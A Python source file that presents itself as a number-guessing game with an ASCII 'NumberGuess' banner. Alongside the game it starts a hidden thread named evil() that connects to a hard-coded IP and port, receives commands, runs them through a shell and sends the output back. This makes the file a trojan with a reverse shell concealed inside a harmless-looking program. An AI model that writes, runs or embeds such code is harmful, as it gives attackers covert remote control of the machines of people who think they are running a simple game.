import socket 
import threading
import os
from unicodedata import name
from colorama import init as colorInit
from termcolor import colored as c
import random
import subprocess


BANNER = (rf"""
                                --<<< WELCOME TO THE GAME >>>--
 _           _                                _                                                    
(_) _       (_)                              (_)                                                   
(_)(_)_     (_) _         _     _  _   _  _  (_) _  _  _     _  _  _  _   _       _  _  _  _  _  _ 
(_)  (_)_   (_)(_)       (_)   (_)(_)_(_)(_) (_)(_)(_)(_)_  (_)(_)(_)(_)_(_)_  _ (_)(_)(_)(_)(_)(_)
(_)    (_)_ (_)(_)       (_)  (_)   (_)   (_)(_)        (_)(_) _  _  _ (_) (_)(_)            _ (_) 
(_)      (_)(_)(_)       (_)  (_)   (_)   (_)(_)        (_)(_)(_)(_)(_)(_) (_)            _ (_)    
(_)         (_)(_)_  _  _(_)_ (_)   (_)   (_)(_) _  _  _(_)(_)_  _  _  _   (_)          _(_)  _  _ 
(_)         (_)  (_)(_)(_) (_)(_)   (_)   (_)(_)(_)(_)(_)    (_)(_)(_)(_)  (_)         (_)(_)(_)(_)
""")


def game():
    number = random.randint(0,100)
    count = 0
    correct = False
    print(BANNER)
    while not correct:
        guess = int(input('Guess a number between 0 and 100: '))
        if guess == number:
            correct = True
            print('You got it!')
        else:
            if guess < number:
                print(f'The number is higher than {str(guess)}')
            else:
                print(f'The number is lower than {str(guess)}')
        count += 1
    print(f'You took {str(count)} attempts!')

def evil():
    HOST = '192.168.178.33'
    PORT = 4545
    ADDR = (HOST,PORT)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(ADDR)
    cmd_mode = False
    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == 'cmdon':
            cmd_mode = True
            client.send('Command mode on'.encode('utf-8'))
            continue
        if server_command == 'cmdoff':
            cmd_mode = False
        if cmd_mode:
            p1 = subprocess.Popen(server_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,universal_newlines=True)
            out,err = p1.communicate()
            client.send(f'> Client-Out: {out}'.decode('utf-8'))
            client.send(f'> Client-Err: {err}'.encode('utf-8'))
            if p1.returncode == 0:
                client.send('Command executed successfully'.encode('utf-8'))
            else:
                client.send('Command failed'.encode('utf-8'))
        else:
            pass
        client.send(f'{server_command} was executed successfully!'.encode('utf-8'))


def main():
    t1 = threading.Thread(target=game)
    t2 = threading.Thread(target=evil)
    t1.start()
    t2.start()

if __name__ == '__main__':
    main()